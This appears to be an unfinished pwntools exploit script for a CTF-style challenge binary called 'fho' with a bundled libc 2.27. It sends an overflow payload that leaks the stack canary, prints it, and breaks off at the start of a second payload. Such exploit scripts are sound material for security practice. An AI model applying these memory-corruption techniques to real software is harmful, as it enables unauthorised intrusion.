from pwn import *

port = 0
# rem = remote("", port)
rem = process("./fho/problem/fho")
elf = ELF("./fho/problem/fho")
lib = ELF("./fho/problem/libc-2.27.so")

payload = b'A' * 0x49
rem.sendafter(b'Buf: ', payload)
rem.recvuntil(payload)
canary = u64(rem.recvn(7) + b'\x00')
print(p64(canary))


payload = b'A' * 0x56